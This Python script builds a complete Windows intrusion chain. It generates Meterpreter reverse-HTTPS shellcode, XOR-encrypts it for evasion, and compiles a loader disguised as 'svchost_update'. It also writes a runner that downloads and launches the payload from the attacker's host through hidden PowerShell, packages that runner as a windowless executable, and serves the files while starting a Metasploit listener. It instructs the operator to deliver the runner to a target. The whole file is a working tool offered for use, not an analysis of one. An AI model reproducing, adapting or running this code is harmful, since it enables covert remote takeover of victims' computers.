#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import http.server
import socketserver
import shutil
import argparse

# ---------- config ----------
KEY = 0xB5
HTTP_PORT = 8080
LOADER_SRC = "loader.c"
SHELL_RAW = "shellcode.bin"
SHELL_ENC = "encrypted_shell.bin"

# ---------- helpers ----------
def die(msg, code=1):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)

def run(cmd, check=True):
    print(f"[*] {cmd}")
    r = subprocess.run(cmd, shell=True)
    if check and r.returncode != 0:
        die(f"command failed: {cmd}")
    return r.returncode

# ---------- phase 1: shellcode ----------
def gen_shellcode(lhost, lport):
    print("[*] generating shellcode...")
    run(f"msfvenom -p windows/x64/meterpreter_reverse_https "
        f"LHOST={lhost} LPORT={lport} -f raw -o {SHELL_RAW}")
    if not os.path.isfile(SHELL_RAW):
        die("msfvenom produced no output")

def encrypt_shellcode():
    print("[*] encrypting shellcode...")
    with open(SHELL_RAW, "rb") as f:
        raw = f.read()
    enc = bytes(b ^ KEY for b in raw)
    with open(SHELL_ENC, "wb") as f:
        f.write(enc)

    # verify
    with open(SHELL_ENC, "rb") as f:
        check = f.read()
    dec = bytes(b ^ KEY for b in check)
    if dec != raw:
        die("encryption verify FAILED")
    print(f"[+] {len(enc)} bytes encrypted and verified")

    # OPSEC: drop raw
    os.remove(SHELL_RAW)

# ---------- phase 2: loader ----------
def compile_loader(name):
    if not os.path.isfile(LOADER_SRC):
        die(f"{LOADER_SRC} not found in cwd")
    print(f"[*] compiling loader -> {name}.exe")
    run(f"x86_64-w64-mingw32-gcc {LOADER_SRC} -o {name}.exe "
        f"-mwindows -O2 -fvisibility=hidden -s -Wl,--strip-all "
        f"-lkernel32 -lntdll")
    if not os.path.isfile(f"{name}.exe"):
        die("compiler produced no output")

# ---------- phase 3: runner ----------
RUNNER_TEMPLATE = '''\
import os
import sys
import subprocess

def log_message(text):
    with open("log.txt", "a") as f:
        f.write(text + "\\n")

LHOST = "{lhost}"
LOADER_NAME = "{loader_name}"
SHELL_NAME = "{shell_name}"
PORT = {http_port}

try:
    log_message("Attempting to download loader...")
    cmd_loader = (
        f'powershell -WindowStyle Hidden -Command '
        f'"Invoke-WebRequest -Uri http://{{LHOST}}:{{PORT}}/{{LOADER_NAME}} '
        f'-OutFile {{LOADER_NAME}}"'
    )
    os.system(cmd_loader)

    log_message("Attempting to download shell...")
    cmd_shell = (
        f'powershell -WindowStyle Hidden -Command '
        f'"Invoke-WebRequest -Uri http://{{LHOST}}:{{PORT}}/{{SHELL_NAME}} '
        f'-OutFile {{SHELL_NAME}}"'
    )
    os.system(cmd_shell)

    log_message(f"cwd: {{os.getcwd()}}")
    log_message(f"files: {{os.listdir('.')}}")

    if os.path.isfile(LOADER_NAME) and os.path.isfile(SHELL_NAME):
        log_message("both files present")
    else:
        log_message("missing files, aborting")
        sys.exit(1)

    log_message("launching loader...")
    subprocess.Popen(
        f".\\\\{{LOADER_NAME}}",
        shell=True,
        creationflags=subprocess.CREATE_NO_WINDOW,
        cwd=os.getcwd()
    )
    log_message("loader launched")

except Exception as e:
    log_message(f"error: {{e}}")
'''

def write_runner(lhost, loader_name):
    code = RUNNER_TEMPLATE.format(
        lhost=lhost,
        loader_name=f"{loader_name}.exe",
        shell_name=SHELL_ENC,
        http_port=HTTP_PORT,
    )
    with open("runner.py", "w", encoding="utf-8") as f:
        f.write(code)
    print("[+] runner.py written")

def build_runner_exe():
    if shutil.which("pyinstaller") is None:
        print("[!] pyinstaller not found — skipping .exe build, runner.py is ready")
        return
    print("[*] building runner.exe...")
    run("pyinstaller --onefile --noconsole --clean runner.py")
    print("[+] dist/runner.exe ready")

# ---------- phase 4: http server ----------
def start_http_server(directory="."):
    handler = lambda *a, **kw: http.server.SimpleHTTPRequestHandler(
        *a, directory=directory, **kw
    )
    httpd = socketserver.TCPServer(("0.0.0.0", HTTP_PORT), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    print(f"[+] http server on 0.0.0.0:{HTTP_PORT} (serving {os.path.abspath(directory)})")
    return httpd

# ---------- phase 5: listener ----------
def build_listener_cmd(lhost, lport):
    script = (
        "use exploit/multi/handler; "
        "set payload windows/x64/meterpreter_reverse_https; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; "
        "set ExitOnSession false; "
        "set AutoRunScript post/windows/manage/migrate; "
        "run"
    )
    return ["msfconsole", "-q", "-x", script]

def start_listener(lhost, lport):
    print("[*] starting msfconsole listener...")
    subprocess.run(build_listener_cmd(lhost, lport))

# ---------- main ----------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", required=True, type=int)
    ap.add_argument("--loader-name", default="svchost_update")
    ap.add_argument("--no-http", action="store_true",
                    help="skip starting local http server")
    ap.add_argument("--no-listener", action="store_true",
                    help="skip msf listener prompt")
    args = ap.parse_args()

    gen_shellcode(args.lhost, args.lport)
    encrypt_shellcode()
    compile_loader(args.loader_name)
    write_runner(args.lhost, args.loader_name)
    build_runner_exe()

    httpd = None
    if not args.no_http:
        httpd = start_http_server(".")

    print()
    print("=" * 60)
    print(f"LHOST: {args.lhost}")
    print(f"LPORT: {args.lport}")
    print(f"loader: {args.loader_name}.exe")
    print(f"shell:  {SHELL_ENC}")
    print(f"http:   http://{args.lhost}:{HTTP_PORT}/")
    print("=" * 60)
    print("deliver dist/runner.exe to target, execute, wait ~30s")
    print()

    if not args.no_listener:
        ans = input("set up a listener? [y/N]: ").strip().lower()
        if ans == "y":
            start_listener(args.lhost, args.lport)
        else:
            print("[*] listener skipped. manual command:")
            print("    " + " ".join(build_listener_cmd(args.lhost, args.lport)))
    else:
        print("[*] listener skipped (--no-listener)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] interrupted, exiting")